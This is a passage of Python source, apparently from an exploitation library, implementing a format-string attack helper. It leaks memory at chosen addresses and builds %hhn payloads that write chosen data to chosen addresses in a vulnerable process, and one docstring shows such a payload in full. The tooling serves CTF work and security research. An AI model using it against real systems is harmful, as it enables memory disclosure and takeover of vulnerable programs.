        # Thus the solution to this problem is to check if the next 3 bytes are
        # "ELF" and if so we lie and leak "\x7f"
        # unless it is leaked otherwise.
        if addr & 0xfff == 0 and self.leaker._leak(addr+1, 3, False) == b"ELF":
            return b"\x7f"

        fmtstr = fit({
          self.padlen: b"START%%%d$sEND" % (self.offset + 16//context.bytes),
          16 + self.padlen: addr
        })

        leak = self.execute_fmt(fmtstr)
        leak = re.findall(br"START(.*)END", leak, re.MULTILINE | re.DOTALL)[0]

        leak += b"\x00"

        return leak

    def execute_writes(self):
        """execute_writes() -> None

        Makes payload and send it to the vulnerable process

        Returns:
            None

        """
        fmtstr = randoms(self.padlen).encode()
        fmtstr += fmtstr_payload(self.offset, self.writes, numbwritten=self.padlen + self.numbwritten, write_size='byte')
        self.execute_fmt(fmtstr)
        self.writes = {}

    def write(self, addr, data):
        r"""write(addr, data) -> None

        In order to tell : I want to write ``data`` at ``addr``.

        Arguments:
            addr(int): the address where you want to write
            data(int): the data that you want to write ``addr``

        Returns:
            None

        Examples:

            >>> def send_fmt_payload(payload):
            ...     print(repr(payload))
            ...
            >>> f = FmtStr(send_fmt_payload, offset=5)
            >>> f.write(0x08040506, 0x1337babe)
            >>> f.execute_writes()
            b'%19c%16$hhn%36c%17$hhn%131c%18$hhn%4c%19$hhn\t\x05\x04\x08\x08\x05\x04\x08\x07\x05\x04\x08\x06\x05\x04\x08'

        """
        self.writes[addr] = data
